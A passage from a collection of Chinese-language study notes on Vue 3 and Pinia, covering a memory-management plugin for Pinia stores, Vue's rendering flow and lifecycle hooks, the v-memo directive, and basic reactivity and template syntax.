避免过度拆分\n- 合理设置 chunk 大小\n- 使用预加载提示\n```javascript\n// 预加载相关模块\n<link rel=\"modulepreload\" href=\"/assets/store-user-xxx.js\">\n```\n\n### 9.6. 注意事项\n\n#### 9.6.1. **避免循环依赖**\n\n- 合理组织 store 之间的依赖关系\n- 使用事件总线或其他方式解耦\n\n#### 9.6.2. **控制包大小**\n\n- 监控各个 chunk 的大小\n- 合理合并相关模块\n- 使用 tree-shaking 优化\n\n#### 9.6.3. **缓存策略**\n\n- 合理设置缓存策略\n- 考虑模块更新机制\n- 处理版本控制\n\n## 10. 性能优化点\n\n- 每个命名空间下，都应该提供`清空方法` ，避免内存暴增\n\t- `store.$reset()`\n- **路由切换时清理** ? \n- WeakMap/WeakSet\n\n```javascript\nconst useStore = defineStore('cache', {\n  state: () => ({\n    // 使用 WeakMap 存储对象引用\n    cache: new WeakMap(),\n  }),\n  actions: {\n    setCache(key, value) {\n      this.cache.set(key, value)\n    }\n  }\n})\n\n```\n\n- 实现数据过期策略\n\n```javascript\nconst useStore = defineStore('main', {\n  state: () => ({\n    cache: new Map(),\n    cacheTimeout: new Map()\n  }),\n  actions: {\n    setData(key, value, timeout = 5000) {\n      this.cache.set(key, value)\n      this.cacheTimeout.set(key, Date.now() + timeout)\n      \n      // 设置过期清理\n      setTimeout(() => {\n        if (this.cache.has(key)) {\n          this.cache.delete(key)\n          this.cacheTimeout.delete(key)\n        }\n      }, timeout)\n    },\n    getData(key) {\n      if (!this.cache.has(key)) return null\n      if (Date.now() > this.cacheTimeout.get(key)) {\n        this.cache.delete(key)\n        this.cacheTimeout.delete(key)\n        return null\n      }\n      return this.cache.get(key)\n    }\n  }\n})\n\n```\n\n\n- 清理超过一定时间未访问的数据\n```javascript\nconst useStore = defineStore('main', {\n  state: () => ({\n    data: {}\n  }),\n  actions: {\n    clearInactiveData() {\n      // 清理超过一定时间未访问的数据\n    }\n  }\n})\n\n// 监听 store 变化\nstore.$subscribe((mutation, state) => {\n  // 记录数据访问时间\n  updateAccessTime(mutation.storeId)\n})\n\n```\n\n\n- 监控 store 大小\n\n```javascript\nconst useStore = defineStore('main', {\n  state: () => ({\n    data: {}\n  })\n})\n\n// 开发环境监控 store 大小\nif (process.env.NODE_ENV === 'development') {\n  store.$subscribe((mutation, state) => {\n    const size = new Blob([JSON.stringify(state)]).size\n    if (size > 1024 * 1024) { // 1MB\n      console.warn(`Store size exceeds 1MB: ${size} bytes`)\n    }\n  })\n}\n```\n\n## 11. Pinia 插件来管理数据内存\n\n>  在**大型应用或数据密集型应用**中使用可使用使用这个插件\n\n>  但是，最大内存，最大时间，可能都会影响到业务，最好的办法是，最好是**最近访问10 条？ 的 pinia 命名空间的**\n\n 这个插件将包含数据过期、内存监控、自动清理等功能。\n \n\n```typescript\n// plugins/piniaMemoryManager.ts\n\ninterface MemoryManagerOptions {\n  // 最大存储大小（单位：bytes）\n  maxSize?: number;\n  // 数据过期时间（单位：ms）\n  defaultExpireTime?: number;\n  // 是否开启调试日志\n  debug?: boolean;\n  // 自动清理的阈值（占 maxSize 的百分比）\n  cleanupThreshold?: number;\n  // 是否启用自动清理\n  autoCleanup?: boolean;\n}\n\ninterface StoreMetadata {\n  accessTime: number;\n  size: number;\n  expireTime?: number;\n}\n\nexport function createMemoryManager(options: MemoryManagerOptions = {}) {\n  const {\n    maxSize = 50 * 1024 * 1024, // 默认 50MB\n    defaultExpireTime = 30 * 60 * 1000, // 默认 30 分钟\n    debug = false,\n    cleanupThreshold = 0.8, // 当使用空间达到 80% 时触发清理\n    autoCleanup = true,\n  } = options;\n\n  // 存储元数据\n  const storeMetadata = new Map<string, Map<string, StoreMetadata>>();\n  let totalSize = 0;\n\n  // 日志函数\n  const log = (...args: any[]) => {\n    if (debug) {\n      console.log('[Pinia Memory Manager]', ...args);\n    }\n  };\n\n  // 计算对象大小\n  const calculateSize = (obj: any): number => {\n    return new Blob([JSON.stringify(obj)]).size;\n  };\n\n  // 清理过期数据\n  const cleanupExpiredData = (store: any, storeId: string) => {\n    const storeData = storeMetadata.get(storeId);\n    if (!storeData) return;\n\n    const now = Date.now();\n    let cleaned = false;\n\n    for (const [key, metadata] of storeData.entries()) {\n      if (metadata.expireTime && now > metadata.expireTime) {\n        if (key in store.$state) {\n          delete store.$state[key];\n          totalSize -= metadata.size;\n          storeData.delete(key);\n          cleaned = true;\n          log(`Cleaned expired data: ${storeId}.${key}`);\n        }\n      }\n    }\n\n    return cleaned;\n  };\n\n  // 强制清理最旧的数据\n  const forceCleanup = () => {\n    let entries: [string, Map<string, StoreMetadata>][] = Array.from(storeMetadata.entries());\n    \n    // 按最后访问时间排序\n    entries.sort((a, b) => {\n      const aTime = Math.max(...Array.from(a[1].values()).map(m => m.accessTime));\n      const bTime = Math.max(...Array.from(b[1].values()).map(m => m.accessTime));\n      return aTime - bTime;\n    });\n\n    for (const [storeId, storeData] of entries) {\n      if (totalSize < maxSize * cleanupThreshold) break;\n\n      const store = useStore(storeId);\n      if (!store) continue;\n\n      for (const [key, metadata] of storeData.entries()) {\n        delete store.$state[key];\n        totalSize -= metadata.size;\n        storeData.delete(key);\n        log(`Force cleaned: ${storeId}.${key}`);\n\n        if (totalSize < maxSize * cleanupThreshold) break;\n      }\n    }\n  };\n\n  return defineStore => {\n    return (storeId: string, options: any) => {\n      const store = defineStore(storeId, options);\n      \n      // 初始化store元数据\n      if (!storeMetadata.has(storeId)) {\n        storeMetadata.set(storeId, new Map());\n      }\n\n      // 包装 $state 的 setter\n      const originalState = store.$state;\n      Object.defineProperty(store, '$state', {\n        get() {\n          return originalState;\n        },\n        set(newState) {\n          const storeData = storeMetadata.get(storeId)!;\n          \n          // 更新元数据\n          for (const key in newState) {\n            const size = calculateSize(newState[key]);\n            storeData.set(key, {\n              accessTime: Date.now(),\n              size,\n              expireTime: Date.now() + defaultExpireTime\n            });\n            totalSize += size;\n          }\n\n          // 检查是否需要清理\n          if (autoCleanup && totalSize > maxSize * cleanupThreshold) {\n            log(`Memory threshold exceeded: ${totalSize} bytes`);\n            cleanupExpiredData(store, storeId);\n            if (totalSize > maxSize * cleanupThreshold) {\n              forceCleanup();\n            }\n          }\n\n          originalState = newState;\n        }\n      });\n\n      // 添加辅助方法\n      store.$memoryManager = {\n        // 设置数据过期时间\n        setExpireTime(key: string, time: number) {\n          const storeData = storeMetadata.get(storeId);\n          if (storeData && storeData.has(key)) {\n            storeData.get(key)!.expireTime = Date.now() + time;\n          }\n        },\n\n        // 手动清理数据\n        cleanup() {\n          cleanupExpiredData(store, storeId);\n        },\n\n        // 获取存储状态\n        getStatus() {\n          return {\n            totalSize,\n            maxSize,\n            usage: totalSize / maxSize,\n            storeSize: Array.from(storeMetadata.get(storeId)?.values() || [])\n              .reduce((acc, curr) => acc + curr.size, 0)\n          };\n        },\n\n        // 手动删除数据\n        remove(key: string) {\n          const storeData = storeMetadata.get(storeId);\n          if (storeData && storeData.has(key)) {\n            totalSize -= storeData.get(key)!.size;\n            storeData.delete(key);\n            delete store.$state[key];\n          }\n        }\n      };\n\n      // 订阅 store 变化\n      store.$subscribe((mutation, state) => {\n        const storeData = storeMetadata.get(storeId)!;\n        \n        // 更新访问时间\n        if (mutation.type === 'direct') {\n          const key = mutation.events.key;\n          if (storeData.has(key)) {\n            storeData.get(key)!.accessTime = Date.now();\n          }\n        }\n      });\n\n      return store;\n    };\n  };\n}\n```\n\n使用示例：\n\n```typescript\n// store/index.ts\nimport { createPinia } from 'pinia'\nimport { createMemoryManager } from './plugins/piniaMemoryManager'\n\nconst pinia = createPinia()\n\n// 注册内存管理插件\npinia.use(createMemoryManager({\n  maxSize: 100 * 1024 * 1024, // 100MB\n  defaultExpireTime: 60 * 60 * 1000, // 1小时\n  debug: true,\n  cleanupThreshold: 0.8,\n  autoCleanup: true\n}))\n\nexport default pinia\n```\n\n在 Store 中使用：\n\n```typescript\n// store/userStore.ts\nimport { defineStore } from 'pinia'\n\nexport const useUserStore = defineStore('user', {\n  state: () => ({\n    userList: [],\n    userDetails: {},\n  }),\n  actions: {\n    async fetchUsers() {\n      const users = await api.getUsers()\n      this.userList = users\n      \n      // 设置数据过期时间\n      this.$memoryManager.setExpireTime('userList', 5 * 60 * 1000) // 5分钟后过期\n    },\n\n    async fetchUserDetails(id: string) {\n      const details = await api.getUserDetails(id)\n      this.userDetails[id] = details\n    },\n\n    cleanup() {\n      // 手动清理数据\n      this.$memoryManager.cleanup()\n    },\n\n    checkStatus() {\n      // 获取存储状态\n      const status = this.$memoryManager.getStatus()\n      console.log('Store 内存使用情况:', status)\n    }\n  }\n})\n```\n\n在组件中使用：\n\n```vue\n<template>\n  <div>\n    <button @click=\"checkStoreStatus\">检查存储状态</button>\n    <button @click=\"cleanupStore\">清理存储</button>\n  </div>\n</template>\n\n<script setup>\nimport { useUserStore } from '@/stores/userStore'\n\nconst userStore = useUserStore()\n\nconst checkStoreStatus = () => {\n  const status = userStore.$memoryManager.getStatus()\n  console.log('存储状态:', status)\n}\n\nconst cleanupStore = () => {\n  userStore.$memoryManager.cleanup()\n}\n</script>\n```\n\n这个插件的主要功能：\n\n1. **内存监控**\n   - 跟踪每个 store 的数据大小\n   - 监控总内存使用情况\n   - 提供内存使用状态查询\n\n2. **数据过期机制**\n   - 支持设置数据过期时间\n   - 自动清理过期数据\n   - 手动清理接口\n\n3. **自动内存管理**\n   - 当内存使用超过阈值时自动清理\n   - 优先清理过期数据\n   - 必要时清理最久未访问的数据\n\n4. **调试功能**\n   - 详细的日志输出\n   - 内存使用统计\n   - 性能监控\n\n5. **灵活的配置选项**\n   - 可配置最大内存限制\n   - 可设置默认过期时间\n   - 可调整清理阈值\n\n\n","bgUeZeXa":"\n# Vue3 的页面渲染流程\n\n`#vue3` \n\n\n## 目录\n<!-- toc -->\n ## R1 \n\n==init → mounted → updated →  unmountd==\n- 初始化 \n\t- 创建应用实例\n\t- 初始化响应式系统\n\t- 编译模板\n\t\t- 也可以没有\n- 挂载\n\t- 创建虚拟 DOM\n\t- 渲染真实 DOM\n\t- ==建立响应式联系==\n- 更新\n\t- ==触发响应式更新==\n\t-  diff 算法比较\n\t-  最小化 DOM 操作\n- 卸载\n\t- 清理副作用\n\t- 移除事件监听\n\t- 删除 DOM节点\n\n## 1. 初始化阶段\n\n```javascript\n// 创建应用实例\nconst app = createApp({\n  setup() {\n    const count = ref(0)\n    return { count }\n  },\n  template: '<div>{{ count }}</div>'\n})\n\n// 挂载应用\napp.mount('#app')\n```\n\n\n### 1.1. 创建应用实例\n\n```javascript\n// 简化的createApp实现\nfunction createApp(rootComponent) {\n  const app = {\n    mount(selector) {\n      // 创建根组件的 vnode\n      const vnode = createVNode(rootComponent)\n      \n      // 获取容器元素\n      const container = document.querySelector(selector)\n      \n      // 渲染vnode\n      render(vnode, container)\n    }\n  }\n  return app\n}\n```\n\n### 1.2. 编译模板\n\n```javascript\n// template 会被编译成 render 函数\nfunction render() {\n  return createVNode('div', null, [ctx.count])\n}\n```\n\n### 1.3. 创建虚拟DOM\n\n```javascript\nfunction createVNode(type, props, children) {\n  return {\n    type,\n    props,\n    children,\n    el: null,\n    shapeFlag: getShapeFlag(type)\n  }\n}\n```\n\n## 2. 响应式系统初始化\n\n```javascript\n// 创建响应式对象\nconst state = reactive({\n  count: 0\n})\n\n// 创建计算属性\nconst double = computed(() => state.count * 2)\n\n// 创建副作用\nwatchEffect(() => {\n  console.log('count changed:', state.count)\n})\n```\n\n## 3. 挂载过程\n\n```javascript\nfunction mount(vnode, container) {\n  // 创建DOM元素\n  const el = document.createElement(vnode.type)\n  \n  // 处理props\n  if (vnode.props) {\n    for (const key in vnode.props) {\n      patchProp(el, key, null, vnode.props[key])\n    }\n  }\n  \n  // 处理children\n  if (vnode.children) {\n    mountChildren(vnode.children, el)\n  }\n  \n  // 插入到容器\n  container.appendChild(el)\n  \n  // 保存真实DOM引用\n  vnode.el = el\n}\n```\n\n## 4. 更新流程\n\n```javascript\nfunction patch(n1, n2, container) {\n  if (n1 && !isSameVNodeType(n1, n2)) {\n    unmount(n1)\n    n1 = null\n  }\n  \n  const { type } = n2\n  \n  if (typeof type === 'string') {\n    // 处理普通元素\n    processElement(n1, n2, container)\n  } else if (typeof type === 'object') {\n    // 处理组件\n    processComponent(n1, n2, container)\n  }\n}\n```\n\n## 5. diff 算法\n\n```javascript\nfunction patchChildren(n1, n2, container) {\n  const c1 = n1.children\n  const c2 = n2.children\n  \n  // 新旧子节点的处理\n  if (typeof c2 === 'string') {\n    // 文本节点的处理\n    if (Array.isArray(c1)) {\n      unmountChildren(c1)\n    }\n    if (c1 !== c2) {\n      container.textContent = c2\n    }\n  } else if (Array.isArray(c2)) {\n    // 数组节点的处理\n    if (Array.isArray(c1)) {\n      // 双端diff算法\n      patchKeyedChildren(c1, c2, container)\n    } else {\n      container.textContent = ''\n      mountChildren(c2, container)\n    }\n  }\n}\n```\n\n## 6. 完整的渲染示例\n\n```javascript\n// 组件定义\nconst MyComponent = {\n  setup() {\n    const count = ref(0)\n    \n    const increment = () => {\n      count.value++\n    }\n    \n    // 监听变化\n    watch(count, (newVal, oldVal) => {\n      console.log(`Count changed from ${oldVal} to ${newVal}`)\n    })\n    \n    return {\n      count,\n      increment\n    }\n  },\n  \n  template: `\n    <div>\n      <p>Count: {{ count }}</p>\n      <button @click=\"increment\">Increment</button>\n    </div>\n  `\n}\n\n// 创建应用并挂载\nconst app = createApp(MyComponent)\napp.mount('#app')\n```\n\n## 7. 生命周期钩子的执行顺序\n\n```javascript\nconst MyComponent = {\n  setup() {\n    onBeforeMount(() => {\n      console.log('Before Mount')\n    })\n    \n    onMounted(() => {\n      console.log('Mounted')\n    })\n    \n    onBeforeUpdate(() => {\n      console.log('Before Update')\n    })\n    \n    onUpdated(() => {\n      console.log('Updated')\n    })\n    \n    return {}\n  }\n}\n```\n\n## 8. 异步组件的渲染\n\n```javascript\nconst AsyncComponent = defineAsyncComponent({\n  loader: () => import('./components/MyComponent.vue'),\n  loadingComponent: LoadingComponent,\n  errorComponent: ErrorComponent,\n  delay: 200,\n  timeout: 3000\n})\n```\n\n## 9. 性能优化相关\n\n- 使用`v-memo`优化列表渲染\n- 使用`shallowRef/shallowReactive`优化大数据\n- 使用`v-once`优化静态内容\n  \n\n```javascript hl:1,8,13\n// 1. 使用v-memo优化列表渲染\n<template>\n  <div v-for=\"item in list\" :key=\"item.id\" v-memo=\"[item.id, item.name]\">\n    {{ item.name }}\n  </div>\n</template>\n\n// 2. 使用shallowRef/shallowReactive优化大数据\nconst state = shallowRef({\n  deepNestedData: {...}\n})\n\n// 3. 使用v-once优化静态内容\n<template>\n  <div v-once>\n    {{ staticContent }}\n  </div>\n</template>\n```\n\n## 10. 错误处理\n\n```javascript\napp.config.errorHandler = (err, vm, info) => {\n  // 处理渲染过程中的错误\n  console.error('Render Error:', err)\n  console.log('Error Component:', vm)\n  console.log('Error Info:', info)\n}\n```\n\n\n\n","XlucI9FE":"\n# created 和 mounted 这两个生命周期钩子的区别\n\n`#vue3` \n\n\n## 目录\n<!-- toc -->\n ## R1 \n\n- `实例创建`完成后调用\n- `组件被挂载到 DOM` 后调用\n- 父子组件调用顺序\n\t- 父依赖于子组件 `created` 和 `mounted` 都好了\n- `setup` 等价于  `created`\n\n## 1. 执行时机不同\n\n```javascript hl:18\n// Options API 方式\nexport default {\n  created() {\n    // 在实例创建完成后被立即调用\n    // 此时组件实例已经创建完成，但还没有挂载到 DOM\n  },\n  mounted() {\n    // 在组件被挂载到 DOM 后调用\n    // 此时可以访问到真实的 DOM 元素\n  }\n}\n\n// Composition API 方式\nimport { onMounted } from 'vue'\n\nexport default {\n  setup() {\n    // 相当于 created\n    console.log('setup执行，组件创建完成')\n    \n    onMounted(() => {\n      // 组件挂载到 DOM 后执行\n      console.log('组件已挂载到 DOM')\n    })\n  }\n}\n```\n\n## 2. 可访问的内容不同\n\n```javascript\nexport default {\n  data() {\n    return {\n      message: 'Hello'\n    }\n  },\n  created() {\n    // ✅ 可以访问响应式数据\n    console.log(this.message)\n    \n    // ❌ 不能访问 DOM\n    console.log(this.$el) // undefined\n    \n    // ✅ 可以进行数据请求\n    this.fetchData()\n  },\n  mounted() {\n    // ✅ 可以访问响应式数据\n    console.log(this.message)\n    \n    // ✅ 可以访问 DOM\n    console.log(this.$el)\n    console.log(document.getElementById('app'))\n    \n    // ✅ 可以进行 DOM 操作\n    this.$el.querySelector('.title').style.color = 'red'\n  }\n}\n```\n\n## 3. 使用场景不同\n\n```javascript\nexport default {\n  created() {\n    // 适合做的事情：\n    // 1. 初始化数据\n    this.initData()\n    \n    // 2. 进行数据请求\n    this.fetchUserInfo()\n    \n    // 3. 添加事件监听（不涉及 DOM）\n    window.addEventListener('resize', this.handleResize)\n  },\n  mounted() {\n    // 适合做的事情：\n    // 1. DOM 操作\n    this.$refs.myInput.focus()\n    \n    // 2. 第三方库初始化（需要 DOM）\n    new Chart(this.$refs.chart)\n    \n    // 3. 需要元素尺寸的计算\n    this.elementWidth = this.$el.offsetWidth\n  }\n}\n```\n\n## 4. 在异步组件中的表现\n\n```javascript hl:7\n// AsyncComponent.vue\nexport default {\n  async setup() {\n    const data = await fetchData() // 异步操作\n    \n    onMounted(() => {\n      // 只有在异步操作完成并组件挂载后才会执行\n      console.log('组件挂载完成')\n    })\n    \n    return { data }\n  }\n}\n```\n\n## 5. 父子组件的执行顺序\n\n```javascript\n// Parent.vue\nexport default {\n  created() {\n    console.log('Parent created')\n  },\n  mounted() {\n    console.log('Parent mounted')\n  }\n}\n\n// Child.vue\nexport default {\n  created() {\n    console.log('Child created')\n  },\n  mounted() {\n    console.log('Child mounted')\n  }\n}\n\n// 执行顺序：\n// 1. Parent created\n// 2. Child created\n// 3. Child mounted\n// 4. Parent mounted\n```\n\n## 6. 主要区别总结\n\n- 执行时机：\n\t- created：在组件实例创建完成后立即执行\n\t- mounted：在组件挂载到 DOM 后执行\n- DOM 访问：\n\t- created：无法访问 DOM，因为组件还未挂载\n\t- mounted：可以访问 DOM，组件已经挂载完成\n- 适用场景：\n\t- created：\n\t\t - 初始化数据\n\t\t - 数据请求\n\t\t - 设置事件监听（不涉及 DOM）\n\t- mounted：\n\t\t - DOM 操作\n\t\t - 第三方库初始化（需要 DOM）\n\t\t - 需要访问子组件\n\t\t - 需要元素尺寸计算\n- Composition API 中：\n\t- created 钩子对应 `setup` 函数本身\n\t- mounted 钩子对应 `onMounted` 函数\n- 注意事项：\n\t- 在 created 中进行的数据请求可能导致**页面闪烁**\n\t- mounted 不保证**所有子组件都已挂载完成**，如需要可以使用 `nextTick`\n\n## 7. 使用建议\n\n1. 如果不需要访问 DOM，优先在 created 中进行数据初始化和请求\n2. 涉及 DOM 操作的逻辑都放在 mounted 中\n3. 使用 Composition API 时，优先考虑使用 setup + onMounted 的组合\n4. 需要在服务器端渲染时，要注意 mounted 钩子只会在客户端执行\n\n","vtfiPOVb":"\n# v-memo 介绍\n\n`#vue3` \n\n\n## 目录\n<!-- toc -->\n ## R1 \n\n- 是 `Vue 3.2+` 引入的一个性能优化指令，用于**缓存部分模板并跳过不必要的更新**\n\t- `<div v-memo=\"[value1, value2]\">`\n\n\n---\n\n\n> 需要结合编译工作，仅在指定的值变化时，才会更新，避免不必要的 Diff，和渲染更新操作\n\n## 1. **基本语法**\n\n```vue\n<template>\n  <!-- 基础用法：数组中的值没有变化时，将跳过这部分的更新 -->\n  <div v-memo=\"[value1, value2]\">\n    {{ expensiveComputation }}\n  </div>\n</template>\n```\n\n## 2. **完整示例**\n\n```vue\n<script setup>\nimport { ref } from 'vue'\n\nconst count = ref(0)\nconst name = ref('John')\nconst age = ref(25)\n\nconst increment = () => {\n  count.value++\n}\n</script>\n\n<template>\n  <div>\n    <!-- 计数器不会影响下面 v-memo 的内容 -->\n    <button @click=\"increment\">Count: {{ count }}</button>\n\n    <!-- 只有当 name 或 age 改变时才会更新 -->\n    <div v-memo=\"[name, age]\">\n      <h2>Name: {{ name }}</h2>\n      <p>Age: {{ age }}</p>\n      <p>Expensive computation: {{ name.split('').reverse().join('') }}</p>\n    </div>\n  </div>\n</template>\n```\n\n## 3. **列表渲染中的使用**\n\n```vue hl:13\n<script setup>\nimport { ref } from 'vue'\n\nconst list = ref([\n  { id: 1, name: 'John', age: 25 },\n  { id: 2, name: 'Jane', age: 30 },\n  { id: 3, name: 'Bob', age: 35 }\n])\n</script>\n\n<template>\n  <div>\n    <!-- 只有当项目的 name 和 age 改变时才会更新对应的列表项 -->\n    <div v-for=\"item in list\" :key=\"item.id\" v-memo=\"[item.name, item.age]\">\n      <h3>{{ item.name }}</h3>\n      <p>Age: {{ item.age }}</p>\n      <!-- 复杂计算 -->\n      <p>Name reversed: {{ item.name.split('').reverse().join('') }}</p>\n    </div>\n  </div>\n</template>\n```\n\n## 4. **条件渲染中的使用**\n\n```vue\n<script setup>\nimport { ref } from 'vue'\n\nconst show = ref(true)\nconst user = ref({\n  name: 'John',\n  role: 'admin'\n})\n</script>\n\n<template>\n  <div>\n    <button @click=\"show = !show\">Toggle</button>\n\n    <div v-if=\"show\" v-memo=\"[user.role]\">\n      <!-- 只有当 user.role 改变时才会重新渲染 -->\n      <h2>User Role: {{ user.role }}</h2>\n      <div>Complex permission calculations...</div>\n    </div>\n  </div>\n</template>\n```\n\n## 5. **动态值的使用**： computed\n\n```vue\n<script setup>\nimport { ref, computed } from 'vue'\n\nconst firstName = ref('John')\nconst lastName = ref('Doe')\nconst fullName = computed(() => `${firstName.value} ${lastName.value}`)\nconst age = ref(25)\n\nconst isAdult = computed(() => age.value >= 18)\n</script>\n\n<template>\n  <div>\n    <!-- 使用计算属性 -->\n    <div v-memo=\"[fullName, isAdult]\">\n      <h2>{{ fullName }}</h2>\n      <p>Status: {{ isAdult ? 'Adult' : 'Minor' }}</p>\n    </div>\n  </div>\n</template>\n```\n\n## 6. **注意事项和最佳实践**\n\n```vue\n<script setup>\nimport { ref } from 'vue'\n\nconst user = ref({\n  name: 'John',\n  age: 25,\n  address: {\n    city: 'New York',\n    country: 'USA'\n  }\n})\n\nconst count = ref(0)\n</script>\n\n<template>\n  <!-- ⚠️ 不好的做法：使用整个对象作为依赖 -->\n  <div v-memo=\"[user]\">\n    {{ user.name }}\n  </div>\n\n  <!-- ✅ 好的做法：只使用需要的属性 -->\n  <div v-memo=\"[user.name, user.age]\">\n    {{ user.name }} - {{ user.age }}\n  </div>\n\n  <!-- ⚠️ 过度使用：简单内容不需要 v-memo -->\n  <div v-memo=\"[count]\">\n    {{ count }}\n  </div>\n</template>\n```\n\n## 7. **性能优化场景**\n\n```vue\n<script setup>\nimport { ref } from 'vue'\n\nconst items = ref(Array.from({ length: 1000 }, (_, i) => ({\n  id: i,\n  name: `Item ${i}`,\n  value: Math.random()\n})))\n\nconst searchTerm = ref('')\n</script>\n\n<template>\n  <input v-model=\"searchTerm\">\n  \n  <!-- 大列表渲染优化 -->\n  <div class=\"list\">\n    <div\n      v-for=\"item in items\"\n      :key=\"item.id\"\n      v-memo=\"[item.name, item.value]\"\n      class=\"list-item\"\n    >\n      <h3>{{ item.name }}</h3>\n      <p>Value: {{ item.value.toFixed(4) }}</p>\n      <!-- 复杂计算或格式化 -->\n      <p>Formatted: {{ new Intl.NumberFormat().format(item.value) }}</p>\n    </div>\n  </div>\n</template>\n```\n\n## 8. **何时使用 v-memo**\n\n- ✅ 适合使用的场景：\n  - 大型列表渲染\n  - 复杂的计算或格式化\n  - 需要频繁更新的组件中的静态部分\n\n- ❌ 不适合使用的场景：\n  - 简单的数据展示\n  - 经常变化的数据\n  - 已经使用其他缓存机制（如 computed）的场景\n\n## 9. 总结\n\n1. v-memo 是一个强大的性能优化工具\n2. 应该谨慎使用，只在真正需要的地方使用\n3. 依赖数组应该精确指定需要监听的值\n4. 不要过度优化，简单内容不需要使用 `v-memo`\n5. 主要用于大型列表或复杂计算的优化\n","Gs9xZ9Jt":"\n# Vue3 基础：篇三\n\n`#vue3` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. Vue 应用实例 \n\n- 通过 `createApp` 函数创建新的应用实例\n- 应用实例需要一个`根组件`来渲染内容\n- 使用 `.mount() `方法挂载应用实例到` DOM 元素`上\n- 可以配置应用实例的全局选项和资源，比如\n\t- 应用级别错误处理器：`app.config.errorHandler = (err) => {})`\n\t- 注册一个全局组件： `app.component('TodoDeleteButton', TodoDeleteButton)`\n- 一个页面可以创建多个共存的 Vue 应用实例。\n\n## 2. Vue 模板\n\n1、Vue 使用基于 `HTML` 的模板语法, 将组件实例的数据绑定到呈现的 DOM 上\n\n2、`文本插值`使用双大括号语法，可以将组件属性显示为纯文本\n\n3、使用 `v-html 指令`可以将属性插入为`原始 HTML`, 但要注意安全风险\n\n3、属性绑定使用 `v-bind` 指令或其`简写`， 可以**动态绑定**多个 HTML 属性\n\n4、`指令`是带有 `v- 前缀`的特殊属性,可以根据表达式的值更新 DOM，`指令`可以带有参数,如 `v-bind:href` 或 `v-on:click`,用于指定绑定的目标\n\n5、`动态参数`允许使用`js 表达式`计算参数名称,如` :[someAttrObj]`\n\n6、`修饰符`是以点开头的特殊后缀，用于指定指令需要以特殊方式绑定，如` .prevent`。\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/3df5cd42ab14e6bb604f1a7fc53e3e91.png)\n\n7、JavaScript 表达式可以被使用在如下场景上\n\n- 在文本插值中 (双大括号)\n- 在任何 Vue 指令 (以 `v- 开头`的特殊 attribute) attribute 的值中\n\n## 3. 响应式基础\n\n1、建议使用 `<script setup>`，**来简化暴露大量的状态和方法的繁琐**\n\n2、`ref`可以包装`任何类型`的值并保持`深层响应性` ，即改变嵌套对象或数组时，变化也会被检测到\n\n- 在`模板`渲染上下文中，只有`顶级的 ref` 属性才会被解包\n- DOM 更新不适合 ref 变化同步的，`nextTick()` 后可以保证更新\n- 非模板场景，**解构里面的属性也会丢失响应性**\n\n3、`reactive()` 将使`对象本身`具有响应性；\n\n- 另外只有`代理对象`是响应式的，更改`原始对象`不会触发更新\n- 同一个对象上调用 `reactive() `会返回相同的代理\n- 在一个代理上调用 `reactive() `会返回它自己\n\t- `reactive()` 的局限性\n\t- `reactive()` 只能处理对象类型，不能处理原始类型\n\t- `reactive()` 不能替换整个对象，否则会丢失响应式\n\t- `解构`会丢失响应性，比如 `let { count } = state` 中，修改 `count`就没用了\n\n```javascript\nimport { reactive } from 'vue'\n\n// 只有代理对象是响应式的，更改原始对象不会触发更新\nconst raw = {}\nconst proxy = reactive(raw)\n\n\n// 在同一个对象上调用 reactive() 会返回相同的代理\nconsole.log(reactive(raw) === proxy) // true\n\n// 在一个代理上调用 reactive() 会返回它自己\nconsole.log(reactive(proxy) === proxy) // true\n\n\nlet state = reactive({ count: 0 })\n\n// 上面的 ({ count: 0 }) 引用将不再被追踪\n// (响应性连接已丢失！)\nstate = reactive({ count: 1 })\n```\n\n## 4. 计算属性\n\n- 计算属性可以用来描述依赖响应式状态的复杂逻辑，比方法更加优雅和高效\n- 计算属性基于其响应式依赖被`缓存`,只有在依赖变化时才会重新计算,这`对于性能敏感的场景`很有帮助。\n- 计算属性可以定义为`可写属性`,提供 `getter` 和 `setter` 方法。\n- 计算属性的 `getter` 应该只做计算而没有任何`副作用`，不应该改变其他状态或执行异步操作。\n- 计算属性返回的值应该被视为`只读的`，不应该直接修改它，而是`应该更新它所依赖的源状态`\n\n```vue\n<script setup>\n  import { ref, computed } from 'vue'\n\n  const firstName = ref('John')\n  const lastName = ref('Doe')\n\n  const fullName = computed({\n    // getter\n    get() {\n      return firstName.value + ' ' + lastName.value\n    },\n    // setter\n    set(newValue) {\n      // 注意：我们这里使用的是解构赋值语法\n      [firstName.value, lastName.value] = newValue.split(' ')\n    }\n  })\n</script>\n```\n\n## 5. 类与样式\n\n- `:class ` 和 `:style` 都可以绑定`数组` 或者 `对象`，并且最后会被`合并` 处理。\n- `:style` 绑定的属性名可以使用 `camelCase` 或 `kebab-case`。\n- Vue 使用 `:style` 会自动添加`前缀`\n\n## 6. 条件渲染\n\n- `v-if`\n\t- `v-if 指令`用于条件性地渲染内容，**仅在表达式返回真值时渲染**。 \n\t- 注意 `v-if ` `v-else-if` `v-else` 三个的配对关系。\n- `v-if` 与 `v-show`\n\t- `v-if` 是真实的按条件渲染，切换时**销毁与重建事件监听器和子组件**；\n\t- `v-show `则简单切换 CSS 属性（即始终保留在 DOM 中，**仅切换 display 属性**）\n\t- `v-if` 有**更高的切换开销**\n\t- 而 `v-show` 有**更高的初始渲染开销**\n\t- ` v-if` 优先级高于 `v-for`， 不推荐同时使用。\n\n## 7. 列表渲染\n\n- 循环范围： `v-for=\"n in 10\"`\n- 循环列表：`v-for=\"item in items\"`\n- 使用 `of` ： `v-for=\"item of items\"`\n- 使用 `key` 优化性能\n- 在`计算属性`中使用 `reverse()` 和 `sort()` 会修改原数组，务必小心\n\n```js\n- return numbers.reverse()\n+ return [...numbers].reverse()\n```\n\n## 8. 事件处理\n\n- 使用 `v-on` 指令监听 DOM 事件，并在事件触发时执行对应的 JavaScript。\n- 内联事件与方法事件\n\t- `内联事件`处理器适用于简单场景\n\t- 而`方法事件`处理器适用于复杂逻辑\n- 如何传入参数？\n\t- 可以在`内联事件处理器`中`调用方法`，并`传入自定义参数`或访问原生事件\n- Vue 提供了多种`事件修饰符`，\n\t- 如 `.stop.prevent.self.capture.once.passive` ，以简化事件处理\n\t- `按键修饰符`和`系统按键修饰符`用于处理特定按键事件\n\t\t- 按键修饰符： `.enter .tab .delete  .esc .space .up .down .left .right`\n\t\t- 系统按键修饰符： `.ctrl .alt .shift .meta` \n\t\t- `.exact` 